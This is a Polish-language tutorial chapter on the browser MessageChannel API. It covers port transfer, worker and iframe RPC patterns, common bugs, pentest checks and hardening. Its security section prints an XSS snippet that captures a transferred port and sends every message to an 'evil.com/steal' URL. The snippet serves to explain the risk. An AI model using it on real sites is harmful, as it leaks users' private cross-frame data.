# Rozdział 24: MessageChannel

## 1. Czym jest MessageChannel

**MessageChannel** to API tworzące para połączonych portów (`MessagePort`) — kanał komunikacji punkt-do-punktu. Każdy port (`port1`, `port2`) może wysyłać i odbierać wiadomości. Wiadomość wysłana do `port1` dociera do `port2` i vice versa — tworząc dwukierunkowy, prywatny kanał komunikacji.

W odróżnieniu od `window.postMessage()`:
- MessageChannel tworzy **dedykowany kanał** (nie rozgłasza do window)
- `MessagePort` można **transferować** — pozwala przekazać kontrolę nad kanałem do innego kontekstu
- Brak potrzeby weryfikacji origin w handlerze (porty są z natury prywatne)
- Stosowany głównie do komunikacji z Workers i między iframes przez strukturyzowane przekazywanie portów

---

## 2. Dlaczego powstał

### Problem: postMessage na window jest "publiczne"

Przy `window.postMessage()` wszystkie handlery `message` na docelowym oknie dostają wiadomość. W aplikacjach z wieloma iframe'ami i workerami — każda wiadomość musi być filtrowana przez `event.origin` i `event.data.type` co prowadzi do złożonego routingu.

MessageChannel rozwiązuje to przez:
- **Prywatny kanał** — tylko posiadacz portu może czytać/pisać
- **Transferowalność** — port można przekazać inaczej niż przez window reference
- **Strukturyzowaną komunikację** — jeden kanał = jeden cel, brak routingu

---

## 3. Jak działa

### Tworzenie i używanie

```javascript
// Tworzenie kanału — daje parę połączonych portów
const { port1, port2 } = new MessageChannel();

// port1 → port2: wiadomość wysłana przez port1 dociera do port2.onmessage
port1.postMessage('hello from port1');
port2.onmessage = ({ data }) => console.log('Dostałem:', data); // 'hello from port1'

// port2 → port1: i w drugą stronę
port2.postMessage('hello from port2');
port1.onmessage = ({ data }) => console.log('Dostałem:', data); // 'hello from port2'

// Zamknij port (drugi port dostanie onclose = "closed" state)
port1.close();
```

### Transfer portów

Kluczowa cecha MessageChannel: porty są **Transferable** — można je przekazać przez `postMessage`:

```javascript
const { port1, port2 } = new MessageChannel();

// Przekaż port2 do iframe przez postMessage
iframe.contentWindow.postMessage('here is your port', '*', [port2]);
// Po transferze: port2 nie istnieje w obecnym kontekście!

// Teraz używaj port1 w parent:
port1.onmessage = ({ data }) => console.log('Od iframe:', data);
port1.postMessage('parent talking');

// W iframe:
window.addEventListener('message', ({ data, ports }) => {
    const port = ports[0]; // odebrany port2
    port.start();
    port.onmessage = ({ data }) => console.log('Od parent:', data);
    port.postMessage('iframe talking');
});
```

### port.start()

MessagePort musi być "uruchomiony" aby dostarczać wiadomości. Dzieje się to automatycznie przez `port.onmessage = ...`, ale przy `addEventListener('message', ...)` trzeba wywołać `port.start()`:

```javascript
port.addEventListener('message', handler);
port.start(); // WYMAGANE z addEventListener

// vs:
port.onmessage = handler; // start() automatycznie
```

---

## 4. Co dzieje się wewnętrznie

### Wewnętrzna kolejka

Każdy `MessagePort` ma wewnętrzną kolejkę wiadomości. Zanim port zostanie "uruchomiony" (`start()`), wiadomości są buforowane. Po uruchomieniu — kolejka jest opróżniana.

### Transfer i Neuter

Gdy port jest transferowany przez `postMessage`, staje się "neutered" (unieważniony) w oryginalnym kontekście. Wszelkie wywołania metod na neutered porcie rzucają `InvalidStateError`.

```javascript
const { port1, port2 } = new MessageChannel();
iframe.contentWindow.postMessage('pass port', '*', [port2]);

// port2 jest teraz neutered:
port2.postMessage('test'); // Błąd: InvalidStateError (The object is in an invalid state)
```

### Połączenie z BroadcastChannel vs postMessage

| Cecha | postMessage(window) | BroadcastChannel | MessageChannel |
|-------|---------------------|-------------------|----------------|
| Kierunek | point-to-point | broadcast | point-to-point |
| Cross-origin | Tak | Nie | Tak (przez transfer) |
| Weryfikacja origin | Wymagana manualnie | Same-origin gwarantowane | Brak (port prywatny) |
| Prywatność | Niska | Niska (same-origin) | Wysoka |

---

## 5. Analogiczny przykład z życia

MessageChannel to intercom między konkretnym biurem a recepcją:

- Instalujesz interkomy (tworzysz MessageChannel) — jeden speaker w biurze, drugi na recepcji
- Przekazujesz jeden speaker (transferujesz port) do biura
- Tylko osoby z tym speakerem mogą rozmawiać (prywatny kanał)
- Nie ma routingu — to dedykowana linia (w odróżnieniu od rozgłośni BroadcastChannel)

---

## 6. Przykład kodu

```javascript
// === Wzorzec: Worker komunikacja przez MessageChannel ===
const worker = new Worker('/worker.js');

function callWorker(method, args) {
    return new Promise((resolve, reject) => {
        const { port1, port2 } = new MessageChannel();
        
        port1.onmessage = ({ data }) => {
            port1.close();
            if (data.error) reject(new Error(data.error));
            else resolve(data.result);
        };
        
        // Wyślij zadanie z port2 do Workera (transfer port2)
        worker.postMessage({ method, args }, [port2]);
        // Worker odpowie przez port2 → dotrze do port1
    });
}

// Użycie:
const result = await callWorker('computeHash', { data: 'input', algo: 'SHA-256' });

// === worker.js ===
self.onmessage = async ({ data: { method, args }, ports: [responsePort] }) => {
    try {
        let result;
        switch (method) {
            case 'computeHash':
                result = await computeHash(args.data, args.algo);
                break;
            default:
                throw new Error(`Unknown method: ${method}`);
        }
        responsePort.postMessage({ result });
    } catch (e) {
        responsePort.postMessage({ error: e.message });
    } finally {
        responsePort.close();
    }
};
```

---

## 7. Przykład z prawdziwej aplikacji

### Secure cross-origin iframe RPC

```javascript
// === main.js (parent, https://app.com) ===
class IframeRPC {
    constructor(iframeEl, iframeOrigin) {
        this.iframe = iframeEl;
        this.origin = iframeOrigin;
        this.pending = new Map();
        
        // Inicjalizacja — przekaż port do iframe
        const { port1, port2 } = new MessageChannel();
        this._port = port1;
        
        port1.onmessage = ({ data }) => {
            const resolver = this.pending.get(data.id);
            if (resolver) {
                this.pending.delete(data.id);
                if (data.error) resolver.reject(new Error(data.error));
                else resolver.resolve(data.result);
            }
        };
        
        // Wyślij port2 do iframe przez initial postMessage
        this.iframe.contentWindow.postMessage(
            { type: 'RPC_INIT' },
            this.origin,
            [port2]
        );
    }
    
    call(method, params = {}) {
        return new Promise((resolve, reject) => {
            const id = crypto.randomUUID();
            this.pending.set(id, { resolve, reject });
            this._port.postMessage({ id, method, params });
            
            // Timeout
            setTimeout(() => {
                if (this.pending.has(id)) {
                    this.pending.delete(id);
                    reject(new Error('RPC timeout'));
                }
            }, 5000);
        });
    }
}

// Użycie:
const rpc = new IframeRPC(document.querySelector('iframe'), 'https://widget.com');
await iframe.onload;
const data = await rpc.call('getData', { filter: 'active' });
```

```javascript
// === widget.js (iframe, https://widget.com) ===
let rpcPort = null;

window.addEventListener('message', ({ data, ports, origin }) => {
    // Tylko initial handshake od parenta
    if (origin !== 'https://app.com') return;
    if (data.type !== 'RPC_INIT') return;
    
    rpcPort = ports[0];
    rpcPort.start();
    
    rpcPort.onmessage = async ({ data: req }) => {
        const HANDLERS = {
            getData: ({ filter }) => fetchData(filter),
            updateConfig: ({ config }) => applyConfig(config)
        };
        
        if (!(req.method in HANDLERS)) {
            rpcPort.postMessage({ id: req.id, error: 'Unknown method' });
            return;
        }
        
        try {
            const result = await HANDLERS[req.method](req.params);
            rpcPort.postMessage({ id: req.id, result });
        } catch (e) {
            rpcPort.postMessage({ id: req.id, error: e.message });
        }
    };
});
```

---

## 8. Typowe błędy programistów

### Błąd 1: Brak port.start() z addEventListener

```javascript
// BŁĄD: wiadomości nie są dostarczane
const { port1 } = new MessageChannel();
port1.addEventListener('message', handler); // addEventListener wymaga start()!
// Wiadomości kolejkują się — handler nigdy nie wywołany

// POPRAWKA:
port1.addEventListener('message', handler);
port1.start(); // ← wymagane

// LUB użyj onmessage (automatycznie startuje):
port1.onmessage = handler; // automatyczny start
```

### Błąd 2: Używanie port po transferze

```javascript
const { port1, port2 } = new MessageChannel();
worker.postMessage({}, [port2]); // transfer port2

port2.postMessage('test'); // Błąd! port2 jest neutered
// POPRAWKA: po transferze używaj tylko port1
port1.postMessage('test through port1');
```

### Błąd 3: Brak close() → wyciek

```javascript
// MessagePort trzyma referencję do swojego "peera"
// Jeśli nie closed → brak GC

function makeChannel() {
    const { port1, port2 } = new MessageChannel();
    return { port1 }; // port2 wyciek!
}
// POPRAWKA: close() niewykorzystane porty
```

---

## 9. Znaczenie dla bezpieczeństwa

### MessagePort jako bezpieczny kanał

Prywatność MessageChannel jest relatywna — zależy od tego jak port2 jest transferowany. Jeśli transferowany przez `postMessage(data, '*', [port2])` → każdy kto przechwyci wiadomość (XSS, frame injection) dostaje port.

```javascript
// BEZPIECZNE:
iframe.contentWindow.postMessage(init, 'https://trusted.com', [port2]);
// Tylko https://trusted.com dostanie port2

// NIEBEZPIECZNE:
iframe.contentWindow.postMessage(init, '*', [port2]);
// Jeśli iframe nawigował do evil.com → evil.com dostaje port!
```

### Persistence ataku przez port

Gdy atakujący zdobędzie MessagePort (przez XSS lub złe targetOrigin):

```javascript
// XSS który przechwytuje port:
window.addEventListener('message', ({ ports, data }) => {
    if (ports.length > 0) {
        const port = ports[0];
        port.start();
        // Nasłuchuj na wszystkie wiadomości przez ten kanał
        port.onmessage = ({ data }) => {
            fetch('https://evil.com/steal?d=' + btoa(JSON.stringify(data)), { mode: 'no-cors' });
        };
        // I odpowiadaj jak gdyby nigdy nic (relay do prawdziwego odbiorcy?)
    }
});
```

### Powiązane CWE

- **CWE-346** — Origin Validation Error (zły targetOrigin przy transferze portu)
- **CWE-79** — XSS (wektor przejęcia portu)

---

## 10. Jak identyfikować podczas pentestu

### Szukanie w kodzie

```javascript
// Grep za:
new MessageChannel()
MessagePort
port1
port2
ports[0]
event.ports

// W DevTools Network: szukaj wiadomości postMessage z ports[]
// W DevTools Sources: szukaj MessageChannel w kodzie JS
```

### Console monitorowanie

```javascript
// Monkey-patch MessageChannel:
const OrigMC = MessageChannel;
window.MessageChannel = function() {
    const mc = new OrigMC();
    console.log('[MessageChannel created]', mc);
    
    const origPort1Post = mc.port1.postMessage.bind(mc.port1);
    mc.port1.postMessage = function(data, ...rest) {
        console.log('[port1 → port2]', data);
        return origPort1Post(data, ...rest);
    };
    
    return mc;
};
```

---

## 11. Jak testować bezpieczeństwo

```
□ Czy port jest transferowany z konkretnym targetOrigin (nie '*')?
□ Czy po transferze port2 jest zamykany (close()) w oryginalnym kontekście?
□ Czy XSS może przechwycić port przez interceptowanie postMessage z ports?
□ Czy dane wysyłane przez port zawierają wrażliwe dane?
□ Czy port jest zamykany po zakończeniu komunikacji (brak wycieków)?
□ Czy handler na odebranym porcie waliduje strukturę wiadomości?
```

---

## 12. Jak się zabezpieczać

```javascript
// 1. Zawsze konkretny targetOrigin przy transferze portu
iframe.contentWindow.postMessage(initMsg, 'https://specific-origin.com', [port2]);

// 2. Zamknij port gdy nie potrzebny
const { port1, port2 } = new MessageChannel();
iframe.contentWindow.postMessage(init, 'https://child.com', [port2]);
// port2 jest teraz neutered — zamknij by zwolnić zasoby:
// (neutered porty i tak nie działają, ale warto być jawnym)

// 3. Waliduj wiadomości na porcie
port.onmessage = ({ data }) => {
    if (!data || typeof data.method !== 'string') return;
    if (!ALLOWED_METHODS.includes(data.method)) return;
    handleRPC(data);
};

// 4. Dodaj timeout i expiry do portów
setTimeout(() => port1.close(), 30000); // port ważny max 30 sekund
```

---

## 13. Podsumowanie

**Kluczowe fakty:**

1. MessageChannel = para połączonych portów, dwukierunkowy prywatny kanał
2. Port jest Transferable — można go przekazać do iframe/Worker przez postMessage
3. Po transferze port staje się neutered w oryginalnym kontekście
4. Wymaga `port.start()` gdy używa się `addEventListener`
5. Bezpieczniejszy niż window.postMessage dla prywatnej komunikacji

**Dla pentestera:**
- Szukaj `new MessageChannel()` i `ports[0]` w kodzie
- Sprawdź targetOrigin przy transferze portów
- XSS może przechwycić port jeśli targetOrigin to `'*'`

---

## Powiązania

```
MessageChannel
    │
    ├──► postMessage (Rozdział 23)
    │         postMessage używane do przekazania (transferu) portów
    │
    ├──► Web Workers (Rozdział 20)
    │         Workers komunikują się przez postMessage; MessageChannel dla strukturyzowanej komunikacji
    │
    ├──► BroadcastChannel (Rozdział 22)
    │         BC = broadcast; MessageChannel = point-to-point prywatny
    │
    └──► Transferable Objects
              ArrayBuffer, MessagePort są Transferable — zero-copy transfer
```
